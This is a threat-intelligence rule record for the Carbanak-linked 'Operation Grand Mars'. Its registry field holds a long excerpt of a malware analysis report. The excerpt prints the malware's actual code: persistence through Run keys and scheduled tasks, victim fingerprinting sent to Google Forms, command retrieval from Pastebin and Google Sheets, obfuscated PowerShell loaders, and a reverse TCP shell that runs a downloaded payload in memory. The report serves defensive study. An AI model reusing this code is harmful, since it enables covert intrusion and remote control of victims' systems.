{"rule_id": 659, "name": "Operation Grand Mars", "description": "-", "references": [], "File_Names": ["LaCradDriver.ini", "322.exe", "httpReq.send", "hostnames.txt", "BinaryStream.type", "TransbaseOdbcDrive.js", "LanCradDriver.vbs", "EyzxpCpBHlaNQvIb.bat", "oNOde.text", "Starter.vbs", "str.vbs", "bInAryStream.TyPe", "UVZHDVlZ.exe", "oNode.tExt", "dttsg.txt", "exe__.exe", "HttpRequest.OPen", "TransbaseOdbcDriver.js", "unprotected.vbe", "Binarystream.ReaD", "sh.run", "UVZHDVlZPVBfXFBeVA.bin", "TransBaseOdbcDriver.js", "procdot.com", "UVZHDVIZ.exe", "stream.Read", "sh.RuN", "oleObject0.bin", "WshShell.Run", "httpReq.open", "oleObject.bin", "www.veil", "AdobeUpdateManagementTool.vbs", "LanCradDriver.ini", "uvzhdviz.exe", "screenshot__.png", "starter.vbs", "P005_ReflectiveDllInjection.pdf", "BinarYStReaM.OpEn", "dennisbabkin.com", "BinarystreAm.Open", "BInaryStrEaM.TyPe", "vbssysteminstall.vbs", "LanbCradDriver.vbs", "cmb_ob.flag", "vb__.vbs", "BinaryStReam.Type", "HttpRequeSt.Send", "insatller.vbs", "framework.com", "Driver.js", "resolv_ip.vbs", "harmonysecurity.com"], "MD5_Hashes": ["E63F45968AE3E534D6A4AFE891830541", "EADF92DE422989D86214AF7E4E5647D7", "5F73BEB23C45006AD952A71FA62C6F9F", "CE7E9C3FB2872D4F500FED248228C3AC", "4EC7088AAC32C94A7046810925BC1697", "DD4F312C7E1C25564A8D00B0F3495E24", "BACE8F2B09C2BFAB35ED9ED98B2E1B83"], "SHA1_Hashes": ["14F5092E2E25EC5479FF5E0F7515A6F17674A845", "188D751B7530DB668B88BDB96EDA50A08C119850", "ECD5293A7FE1CDF262ED921620D80353CDED5DD0", "7B46BB249485B36C318D53FA070D945EA8DBF606", "499E162CF3A80673890BF7FC9FCBFA51B58DAF45", "F040E484DA423540E0A398BAA57E00226A7689D9", "8427358C4C21B7A0C14D638DF1017D0A7FA21182"], "SHA256_Hashes": ["E9F7E0BE49BF2B3A276A664A57FEE4459B77964F1F3BEAE80BC461634BC2A6AF", "B9D6CE9A1DBBD4888F58FC1B3732EF7FE17B00319103AD965237327908D0D254", "7683A9760AED259636C8623B577446406FF22E478CC33FA3095F681F54C2AF3B", "DDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334", "DDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78", "DEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D", "321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57", "7AFE9EA1E8A6398E9C3BA4CAA0EEF788D80B6C07235558D23FDC818E3F9E9F6E", "803009B5CF8D663A2FA3E20651CBDD57DA25908366D886C2EEBC1A4BF7DFC3F0", "EC3980961C6145C96C1220188C6C06AC192AB4B5C4B2E335A96715DE43C62FDB", "EA82AD136A0964EA6E1EC30288BD0D6E41E8AEC2D0206D802BCE7429A8DD69BF", "313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4", "191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2", "BB0DF2ACCC9F34F432AD7A6279003EF4283508F20BDA005605B1245D0D5164A6", "B84C629AC6AB3F8E03D8A52E8D3E874634C1645154C310F18B8F9FBB9D26BA41", "270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA", "22F59C3CDABCECF9F71826D1BCE84FE227462142A437E76DC43046DBC63CE1E8"], "Registry_Entries": ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/TransbaseOdbcDriver\u201d, \nrun_pth,\u201dREG_SZ\u201d\nsh.run\u201dschtasks /create /tn \u201c\u201dSysChecks\u201d\u201d /tr \u201c\u201d\u201d&run_PTh&\u201d\u201d\u201d /sc minute /mo 30\u201d,0,FAlse\nEnd sub\n\nFigure 14.  Persistence of starter.vbs\n\nIn addition to the files created, the embedded script (oleObject1.bin) adds a registry key for persistence, which \ncomprises a scheduled task to call starter.vbs periodically (every 30 min) and finally executes starter.vbs. \n\nAnother interesting function computes a unique CUID using the system\u2019s hard drive serial number. Utilizing  this \nfunction points to the fact that attackers seek a unique identifier from each infected system. The output of the \nfunction is Base64 encoded and stored as \u201ccuid\u201d which is used later on in the operation. \n\n9\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fFUnction cuid()\n\nOn errOr Resume next\nDim Giac\ngiac=\u201d4\u201d\ndim uuid\nuuid=\u201d1\u201d\nDim FSO,D,serial\nSet FSO=CrEATeobjecT(\u201cScripting.FileSystemObject\u201d)\nsTrDrive=fsO.GetDrivEname(fSo.GetSpEcIalFolDer(0))\nseT D=FsO.GEtDrive(strDrive)\nSerial=D.SeriAlNumber\nDiM Result\nResulT=BAse64Encode(\u201c\u201d&SeriaL)\nrEsult=MId(cleArStr(rESult),1,20)\ncuiD=uuid&\u201d.\u201d&giac&\u201d.\u201d&result\n\nenD Function\n\nFigure 15.  Calculating and encoding of Disk S/N\n\nInternet activity also indicated a function that checks for proxy settings on the infected system, an indicator of \nsuspicious internet activity as part of this operation and will be explained later in this document.\n\nProxyEnaBlE=objshelL.RegREad(\u201cHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet \nSettings\\ProxyEnable\u201d)\n\nif ProxyEnable=\u201d1\u201dTheN \n\nProxySeRver=objshell.RegREad(\u201cHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet \nSettings\\ProxyServer\u201d)\n\ngetPRoxy=ProxySeRVEr\nElse GEtProxy=\u201d\u201d\nend if\n\nFigure 16.  Checking proxy configuration\n\nMaIn()\nOn ErroR ResumE nEXt\nDim Txt\ntxt=cuid()\ntxt=tXt&\u201d | \u201c&GetUseRData()\ntxt=tXt&\u201d | \u201c&Iswin32Orwin64()\ntXt=txt&\u201d | \u201c&GetOS()\ndim REs\nres=sendFormData(tXt)\nDim Fso,currDir,currDirPlus\nSet fso=CreateOBjecT(\u201cScripting.FileSystemObject\u201d)\ncurrdiR=fso.GEtParEntFolderNaMe(Wscript.ScriptFullNAMe)\ncurrDirPlus=currdiR&\u201d\\TransbaseOdbcDriver\u201d\nfoldeRInIt currDiRPlus\nggL_rUner currDirplus\ngGl_STarter cUrrDIrPluS\nGgl_hex currDirPlus\nSetREgDatA currdirPlus\nabraCadabra\nEnd Sub\nMain\n\nFigure 17.  Main function\n\n10\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fThe \u201cMain\u201d function takes care of the last bits during this first stage of the operation. Initially it calls cuid(), \ncomputing disk s/n as we\u2019ve seen earlier and then some other helper functions. These gather user data such as \nusername, computer name/domain (GetUseRData), check OS architecture (Iswin32Orwin64) and get OS version \n(GetOS). All of this data is stored in the variable \u201ctxt\u201d and then another function called sendFormData\u201d is used to \nhandle them. \n\n\u201d\n\nFunctIon sendFormDaTa(Value)\nOn ErrOR resume next\nDim foRmkey\nformkeY=\u201de/1FAIpQLSfsumC-aXeUevDfI852NkJN4- \nDiM enTry\nentry=\u201dentry.1269488164\u201d\nDim rc\nDim HttpRequest\nOn ErrOR ReSuMe next\nSet HtTpRequest=CreateobJect(\u201cMsxml2.ServerXMLHTTP.6.0\u201d)\nIf Err.NumbEr<>0 tHen sendFormDatA=falSe\nSet httPReQuEst=Nothing\nExit FuNCtion\nend If\ndim PRoX\nProx=gETProxy\nHttpRequest.OPen\u201dPOST\u201d,\u201dhttps://docs.google.com/forms/d/\u201d&fOrMkeY&\u201d/formResponse\u201d,FalSe\nif prox<>\u201d\u201dthEn HttpreQueSt.setProxy 2,prox,\u201d\u201d\nEnd iF\nHTtpRequesT.sEtRequeStHEadeR\u201dContent-Type\u201d,\u201dapplication/x-www-form-urlencoded\u201d\nOn Error Resume Next\nHttpRequeSt.Send(entry&\u201d=\u201d&ValuE)\nIf HttpRequest.rEadystate<>4 Then httpRequEst.WaitForRespOnse 30\nEnd If\nrc=httpRequest.StatusText\nIf ERr.Number<>0 THeN sendFormData=False\neXit FUnction\nEnd If\nIf Rc=\u201dOK\u201dTHen sendformData=True\nElSe senDFormData=FaLse\nEnD If\nSeT httprequeSt=Nothing\n\nEnd Function\n\nFigure 18.  sendFormData function\n\nThe function shown above is used to connect and submit data using Google Forms. At this stage the information \ngathered before (user data, disk s/n etc.) will be collected by the malware operators using the Google Form \ndisplayed below. \n\n11\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fFigure 19.  Initial submission Google Form\n\nThe name of the form \u201cformFirstPingBotList\u201d is self-explanatory, collecting initial information from victims. Usage of \nsuch services is always beneficiary for attackers since they usually have unrestricted accessin most networks. \n\n12\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fARTIFACTS FROM EMAIL ATTACHMENT\n\nAs we\u2019ve seen, opening the Word document executes the embedded script and drops the following four files:  \n\nFigure 20.  Files dropped on execution of embedded VBE script \n\nNote in the screenshot above, that the LanCradDriver.ini file is a zero-byte file (empty). It is merely \u201ctouched\u201d \nbut not yet populated. As you will see further in this analysis, the file is subsequently populated after the \nTransbaseOdbcDriver.js script has executed. \n\nStarter.vbs\n\nThis is a VBScript file, which as shown earlier, uses registry Autorun and Task Scheduler to achieve persistence and \nexecutes the actual payload. \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\nE63F45968AE3E534D6A4AFE891830541\n\nECD5293A7FE1CDF262ED921620D80353CDED5DD0\n\n270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA\n\n12:9vWd+vqfaHHI7kVLkqhBvKIIXURun+cPqrC:9A+vqfaHHI78LD/KILun+0qrC\n\nTable 1.  Hashes of Starter.vbs\n\nThis is responsible for execution of the TransbaseOdbcDriver.js using wscript.exe within a hidden command prompt. \n\nOn Error Resume Next\nDim objShell,path\nSet objShell = WScript.CreateObject( \u201cWScript.Shell\u201d )\nDim fso, currDir, currDirPlus\nSet fso = CreateObject(\u201cScripting.FileSystemObject\u201d)\ncurrDir = fso.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\npath = currDirPlus & \u201c\\TransbaseOdbcDriver.js\u201d\npath = \u201ccmd.exe /k wscript.exe \u201c\u201d\u201d & path & \u201c\u201d\u201d\u201d\nobjShell.Run path, 0, true \nSet objShell = Nothing\n\nFigure 21.  Starter.vbs script\n\n13\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n\fThe following screenshot displays starter.vbs being started by Task Scheduler. Starter.vbs in turn calls and executes \nTransbaseOdbcDriver.js, which is the core element in this stage of the attack.\n\nFigure 22.  Process information for TransbaseOdbcDriver.js\n\nTransbaseOdbcDriver.js\n\nThis script includes several functions but we will focus on its main operation. \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\n4EC7088AAC32C94A7046810925BC1697\n\n7B46BB249485B36C318D53FA070D945EA8DBF606\n\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\n\n384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi\n\nTable 2.  Hashes of TransbaseOdbcDriver.js\n\nUpon execution it calls LoadLinkSettings() function which connects to Google Spreadsheet executing a Macro \nbased on the unique disk serial number (guid) as seen earlier in the document. \n\nfunction LoadLinkSettings() {\n\nvar go_com = InetRead(\u201chttps://script.google.com/macros/s/AKfycbyHCvQKeEwmgQqB661- \n\naUV_ \n\ntry {\n\n/exec\u201d+ \u201c?bid=\u201d + guid);\n\nif( go_com[\u2018stat\u2019] >= 200 &&  go_com[\u2018stat\u2019] < 300){\n\nvar cmd_txt = go_com[\u2018text\u2019];   \nvar settingsArr = cmd_txt.match(  \n\n/,\\\\x22userHtml\\\\x22:\\\\x22(.+)\\\\x22,\\\\x22ncc/ );\n\nvar setting = split(settingsArr[1],\u2019$$$\u2019,3);\nif (setting.length == 3) { \n\nreturn {\n\n \u201cspreadsheetkey\u201d: setting[0]\n,\u201dformkey\u201d: setting[1]\n,\u201dentry\u201d: setting[2] \n\n}; \n\n}\nvar formkeyReg = \u201ce/1FAIpQLScbMcfvLYkqA369ISWkWovJ_4ZkIc0nFdM4Ec_\n\nCv95PAAnllQ\u201d;\n\n}\n\nvar entryReg = \u201centry.960420097\u201d;\nLogInet(guid,formkeyReg,entryReg); \n\nFigure 23.  LoadLinkSettings() function\n\nThe output of the macro code is then sliced ($$$) retrieving three important pieces of data used in the next steps of \nthe operation:\n\n1.  SpreadSheetKey\n\n2.  FormKey\n\n3.  Entry\n\n14\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fFigure 24.  Google macro execution output\n\nIt then calls LogInet() using these arguments and submits an entry of a new Bot/infected system using Google \nForms. The connection to Google Forms uses an Android HTC Pyramid model (Chinese \u2013 Taiwan language) User-\nagent string. \n\nfunction LogInet(value,formkey,entry) {\ntry {\n\nvar httpReq = new ActiveXObject(\u201cMsxml2.ServerXMLHTTP.6.0\u201d);\nhttpReq.setOption(2, 13056); \nhttpReq.setTimeouts(0, 0, 0, 0);\nurl = \u201chttps://docs.google.com/forms/d/\u201d + formkey + \u201c/formResponse\u201d;\nhttpReq.open(\u201cPOST\u201d, url, false);\nvar prox = getProxy()\nif( prox != \u201c\u201d){\n\nhttpReq.setProxy(2, prox, \u201c\u201d);\n\n}\nhttpReq.setRequestHeader(\u201cUser-agent\u201d, \u201cMozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC \n\nPyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\u201d);\n\nhttpReq.setRequestHeader(\u201cContent-Type\u201d, \u201capplication/x-www-form-urlencoded\u201d); \nhttpReq.send(entry + \u201c=\u201d + value);\n\n} catch (e) {}\n} \n\nFigure 25.  LogInet() function\n\nFigure 26.  Infected system registration using Google Form\n\n15\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fAfter successfully initializing, the script calls GetSourceCode() in an indefinite loop of 1 or 2 min intervals. \n\ndo {\n\n}\n\nif ( setttingArr ) {\n    GetSourceCode(setttingArr.spreadsheetkey, setttingArr.formkey, setttingArr.entry);\n}else{\n\nsetttingArr = LoadLinkSettings(); \n\n}\nWScript.Sleep(1000*60*randInt(1,2));\n\nFigure 27.  Calling GetSourceCode() function\n\nGetSourceCode() function fetches data from Pastebin and stores it in a new file named dttsg.txt. Finally executes \nGetCommand().\n\nfunction GetSourceCode(aspreadsheetkey,aformkey,aentry) {\n        var GlobalObject = this;\n        var FSO = new ActiveXObject(\u201cScripting.FileSystemObject\u201d);\n        var WshShell = new ActiveXObject(\u201cWScript.Shell\u201d);\n        var formkey = aformkey;\n\nvar entry = aentry;\n\n        var spreadsheetkey = aspreadsheetkey;\n        var botclass = GenerateString(8);\n        var last = TextFileRead( GLBFolderPlus + \u201c\\\\dttsg.txt\u201d );\n        var version = \u201c1.0\u201d;\n\nvar linkPB = \u201chttp://pastebin.com/raw/MfQV5e6R\u201d;\nvar keyPath = \u201cHKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\n\nlasts\u201d;  \n\nWshShell.CurrentDirectory = GLBFolderPlus;\n\n        Log();\n        GetCommand();   \n\nFigure 28.  GetSourceCode function\n\nFile dttsg.txt has the following structure and is split into two sections \u201clast\u201d and \u201ccode\u201d and provides another covert \nchannel during this operation. \n\n{last: \u201cabc123\u201d, code: \u201cZGltIHh4eA==\u201d}   \n\nFigure 29.  Code from Pastebin\n\nData from section \u201clast\u201d is written into registry perhaps to keep track of last executed command and \u201ccode\u201d which \nis Base64 encoded used as an argument and allows attackers to execute one of the following commands \u201cDestroy\u201d, \n\u201cGetCompInfo\u201d, \u201cGetProcList\u201d and \u201cRunCMDLine\u201d, as displayed below. However, usage of this feature was not \nobserved during our investigation. \n\n16\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fvar cod_data = Base64.decode(cmb_ob.c); \n\nif(cod_data == \u201c#deleteBot#\u201d){\n\ndestroy(); \n\n}else if(cod_data == \u201c#GetCompInfo#\u201d){\n\nLog(\u201c$stdOut$\u201d + GetComputerInform());\n\n}else if(cod_data == \u201c#GetProcList#\u201d){\n\nLog(\u201c$stdOut$\u201d + GetCompProcess()); \n\n}else if( cod_data.indexOf(\u201c#RunCMDLine#\u201d) !== -1){\n\nvar cmd_str = split(cod_data,\u2019#RunCMDLine#\u2019,2);\nLog(\u201c$stdOut$\u201d + RunCMDLine(cmd_str[1])); \n\n}else{\n\nvar tempname1 = \u201cLanCradDriver.ini\u201d;\nvar tempname2 = \u201cLanCradDriver.vbs\u201d;\nvar tmpPath = GLBFolderPlus;\nvar tempath1 = tmpPath + \u201c\\\\\u201d+tempname1;\nvar tempath2 = tmpPath + \u201c\\\\\u201d+tempname2;\n\nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\nf.Write(cod_data);\nf.Close();\n\nFigure 30.  Arguments from Pastebin\n\nFigure 31.  Pastebin account used for tracking\n\nContinuing into the execution of GetCommand() it connects again to Google Docs, using the spreadsheet key \nobtained in the output of the LoadLinkSettings() and saves the data into the LanCradDriver.ini file. The latter file was \ninitially created as an empty file and now it becomes another key component during the operation. \n\n17\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\ffunction GetCommand() {\n    try {\n\nvar legc = getLastExeGoogCmd();\nvar cmb_ob = {}\ncmb_ob.flag = false;\nvar go_com = InetRead(\u201chttps://docs.google.com/spreadsheet/ccc?key=\u201d + \n\nspreadsheetkey);\n\nif( go_com[\u2018stat\u2019] >= 200 &&  go_com[\u2018stat\u2019] < 300){\nvar cmd_txt = HTMLParse(go_com[\u2018text\u2019]).document.documentElement.innerText;\n\nvar command = split(cmd_txt,\u2019$$$\u2019,3); \nif (command.length == 4) {\n\ncmb_ob.c = command[2];\ncmb_ob.l = command[1];\ncmb_ob.flag = true;\n\n.\n. \n.\n\nvar tempname1 = \u201cLanCradDriver.ini\u201d;\nvar tempname2 = \u201cLanCradDriver.vbs\u201d;\nvar tmpPath = GLBFolderPlus;\nvar tempath1 = tmpPath + \u201c\\\\\u201d+tempname1;\nvar tempath2 = tmpPath + \u201c\\\\\u201d+tempname2;\n\nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\nf.Write(cod_data);\nf.Close();\n\nWScript.Sleep(5000);\nWshShell.Run(\u2018wscript.exe \u201c\u2019 + tempath2 + \u2018\u201d\u2019,0,false);  \n\n} \n\n} \n\nFigure 32.  Downloading code from Google Docs (truncated)\n\nThe actual data which is Base64 encoded as seen in the Google spreadsheet  is then decoded and stored in the \nLanCradDriver.ini file. \n\nFigure 33.  Encoded PowerShell commands retrieved from Google Spreadsheet\n\nContents of the new file, LanCradDriver.ini, reveal that it is actually a VBScript executing a PowerShell script. As a \nfinal step TransbaseOdbcDriver.js executes LanCradDriver.vbs using wscript.exe.\n\n18\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\fOn Error Resume Next\nSet objShell = CreateObject(\u201cWscript.Shell\u201d)\n\nobjShell.Run(\u201cC:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI \n\n- ExecutionPolicy Bypass -C \u201c\u201dsal a New-Object;iex(a IO.StreamReader((a IO.Compression.\nDeflateStream([IO.MemoryStream][Convert]::FromBase64String(\n\nFigure 34.  LaCradDriver.ini (truncated)\n\nLanCradDriver.vbs\n\nThis script simply reads and executes the commands written in the LanCradDriver.ini file (by the \nTransbaseOdbcDriver.js script). \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\n4EC7088AAC32C94A7046810925BC1697\n\n7B46BB249485B36C318D53FA070D945EA8DBF606\n\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\n\n384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi\n\nTable 3.  Hashes of LanCradDriver.vbs\n\nOn Error Resume Next\nDim objFSO, strFile, ReadAllTextFile\nSet objFSO = CreateObject(\u201cScripting.FileSystemObject\u201d)\nDim currDir, currDirPlus\nSet objFSO = CreateObject(\u201cScripting.FileSystemObject\u201d)\ncurrDir = objFSO.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\nstrFile = currDirPlus & \u201c\\LanCradDriver.ini\u201d\nSet objFile = objFSO.OpenTextFile(strFile,1,false,-1)\nIf objFile.AtEndOfStream Then\n\nReadAllTextFile = \u201c\u201d\n\nElse\n\nReadAllTextFile = objFile.ReadAll\n\nEnd If\nobjFile.Close\nExecuteGlobal ReadAllTextFile\n\nFigure 35.  LanbCradDriver.vbs\n\nLanCradDriver.ini\n\nAs seen before TransbaseOdbcDriver.js connects to Google Docs and reads a cell located in a spreadsheet in \nBase64 encoded format. After decoding, the data is then stored as a text file in LanCradDriver.ini \n\nHash Type\n\nValue\n\nMD5\n\nSHA-1\n\nSHA256\n\nSSDeep\n\nEADF92DE422989D86214AF7E4E5647D7\n\n8427358C4C21B7A0C14D638DF1017D0A7FA21182\n\nDEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D\n\n192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\n\nTable 4.  Hashes of LanCradDriver.ini\n\nThe following is a PowerShell command retrieved from the Google spreadsheet and written to the LanCradDriver.ini \nfile post-execution of TransbaseOdbcDriver.js script on the infected system. \n\n19\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n\fOn Error Resume Next\nSet objShell = CreateObject(\u201cWscript.Shell\u201d)\n\nobjShell.Run(\u201cC:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -Execu-\n\ntionPolicy Bypass -C \u201c\u201dsal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.\nMemoryStream][Convert]::FromBase64String(\u2018rVhtT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edb\nbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B/ \n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 \u2026  \njKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==\u2019),[IO.Compression.CompressionMode]::Dec\nompress)),[Text.Encoding]::ASCII)).ReadToEnd()\u201d\u201d\u201d),0, True\n\nobjShell.Run(\u201cpowershell.exe -NoP -NonI -ExecutionPolicy Bypass -C \u201c\u201dsal a New-Object;iex(a \n\nIO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(\u2018rVh-\ntT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edbbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B\n/0uv7Bkd876DUddyyVxvWjQ8f9KpROedSPIhngkhunUeS4AwVcw3SJP+Fu9YYLfS7VRMSLCK7u/gOB3m3+fnX9+exf+ \n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 \u2026 /epSVJVi+dz+WUsUgMgO3acu69CHy731X7rV0tCYglqJOBPYVpfsNCM+OjqPFxgnN/3h\n9Nt0ODq7+jKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==\u2019),[IO.Compression.CompressionM\node]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()\u201d\u201d\u201d),0, True\n\nFigure 36.  LanCradDriver.ini (truncated)\n\nNotice above the usage of Base64 encoding and Deflate in order to conceal the actual PowerShell code.\n\nUpon successful execution of TransBaseOdbcDriver.js this is how the folder contents look. Note that  \nLanCradDriver.ini is no longer a zero-byte file since it has been populated using the commands retrieved from  \nthe Google spreadsheet.\n\nFigure 37.  LanCradDriver.ini populated post-execution of TransbaseOdbcDriver.js\n\nActivity Summary \n\nIn summary, the role of the four dropped files is visually represented by the following activity diagram:\n\nFigure 38.  Role of dropped files and sequence of execution\n\n20\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc. \n \n \n \n\fThe following diagram is a visualization of the Command & Control mechanism used by the malware during this \noperation that involves use of Pastebin, Google Docs (spreadsheets), and Google Forms to exert control over the \ninfected systems. \n\nFigure 39.  Activity diagram showing C&C involving Google Forms and Docs\n\n21\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fFigure 40.  Activity diagram showing C&C in case Google Spreadsheet not available\n\nUsing such a topology of C&C, while not rare, further indicates that we are dealing with a highly organized and \nsophisticated group of attackers rather than an opportunistically motivated, relatively unorganized group or lone  \nwolf attackers. \n\n22\n\nOperation Grand Mars: Defending Against Carbanak Cyber AttacksCopyright \u00a9 2017 Trustwave Holdings, Inc.\fACHIEVING PERSISTENCE \n\nPowerShell Script \n\nAt this point the recently downloaded from Google Docs PowerShell script was decoded and executed on the \ninfected system. As seen in Figure 36 the actual script used PowerShell Deflate and Base64 functions to conceal \nthe payload. After reversing these functions, the output indicates that this script was designed to setup a form of \npersistent backdoor often referred to as a TCP reverse connect shell. \n\nThe following results has been derived: \n\n\u2022  Script connects to an external IP using a common port such as 80. However, it is not using HTTP protocol for transmission.\n\n\u2022  Memory allocation and thread creation code exist. \n\n\u2022  It receives an encrypted (XOR) payload from the external IP.\n\n\u2022  The payload is then decrypted using XOR key of 0x50 and written directly to memory. \n\n$IP = \u201880. 84.49.61\u2019\n$Port = 80\n$XORKEY = 0x50\n$VirtualAlloc = $null\n$CreateThread = $null\n$WaitForSingleObject = $null\n$XORKEY = 0x50\nfunction XorByteArr\n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 \u2026  \n{\n$tcpClient = New-Object System.Net.Sockets.TCPClient\nTry\n{\n$connect = $tcpClient.Connect($IP, $Port)\n}\n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 \u2026  \n$stream = $TcpClient.GetStream()\n$payloadSizeBuff = New-Object Byte[] -ArgumentList 4\n$Null = $stream.Read($payloadSizeBuff, 0, 4)\n[Int]$payloadSize = [System.BitConverter]::ToInt32($payloadSizeBuff, 0)\nWrite-Output \u201cPayload size - $payloadSize\u201d\n[IntPtr]$shellcodeBuff = $VirtualAlloc.Invoke([IntPtr]::Zero, [Math]::Max([Int]($payloadSize + 5), \n0x1000 ), 0x3000, 0x\n40)\n[System.Runtime.InteropServices.Marshal]::WriteByte($shellcodeBuff, 0, [Byte]0xBF)\n[System.Runtime.InteropServices.Marshal]::WriteIntPtr($shellcodeBuff, 1, $tcpClient.Client.Handle)\n$shellcodeBuffTmp = New-Object Byte[] -ArgumentList $payloadSize\n[Int]$bytesRead = 0\nWhile ($payloadSize -gt $bytesRead)\n{\n[Int]$netAnswerSize = $stream.Read($shellcodeBuffTmp, $bytesRead, $tcpClient.Available)\n$bytesRead += $netAnswerSize\n}\n$shellcodeBuffTmp = XorByteArr $shellcodeBuffTmp $XORKEY\nCopy-ToUnmanagedMem $shellcodeBuff $shellcodeBuffTmp 5 $payloadSize\nWrite-Output \u201cReceived payload, run it in a new thread\u201d\n$threadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $shellcodeBuff, [IntPtr]::Zero, 0, \n[IntPtr]::Zero)\nif ($threadHandle -ne [IntPtr]::Zero)\n{\nWrite-Output \u201cSuccessfully created thread!\u201d\nWrite-Output \u201cMeterpreter session created!\u201d\n}\n\u2026 \u2026 \u2026 \u2026  (truncated) \u2026 \u2026 \u2026 \u2026 